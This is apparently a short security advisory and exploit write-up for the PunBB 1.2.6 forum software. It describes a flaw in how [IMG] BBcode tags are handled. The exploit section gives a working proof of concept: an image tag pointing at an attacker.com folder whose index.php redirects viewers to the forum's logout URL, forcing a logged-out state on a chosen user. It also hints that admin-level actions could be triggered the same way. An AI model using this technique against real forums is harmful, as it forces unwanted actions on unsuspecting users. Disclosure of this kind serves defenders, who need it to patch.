~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Version: 1.2.6 and most likely below
url : http://punbb.org
Author: Rickard Andersson
Description:

PunBB is a fast and lightweight PHP powered discussion board. It is released under the GNU Public License. Its primary goal is to be a faster, smaller and less graphic alternative to otherwise excellent discussion boards such as phpBB, Invision Power Board or vBulletin. PunBB has fewer features than many other discussion boards, but is generally faster and outputs smaller pages.

Vulnerabilities:
~~~~~~~~~~~~~~~~

According to the issue that affect PHPBB discovered by easyex recently at http://www.securityfocus.com/bid/14555/info , so it also affected in another bulletin board or forum that allow BBcode such as PunBB.

The issue is due to a failure of the application to properly sanitize user-supplied input in bbcode '[IMG]' tags included in a message or user signature (if allowed , default is off) .

Successful exploitation of this vulnerability could permit the injection of arbitrary HTML or script code into the browser of an unsuspecting user in the context of the affected site.


Exploit: 
~~~~~~~~

just post a message that include

[img]http://attacker.com/yuckfou.png[/img]

yuckfou.png is a folder , and include some "index.php" file

---- index.php ----

<?php
header("Location: http://target.com/punbb1.2.6/login.php?action=out&id=2"); ?>

---- eof ------

so , user with id=2 if open the topics with attacker message include will automatically "logout"

maybe some other interesting in command could put in "index.php" with admin priveledged *_^


THATS all
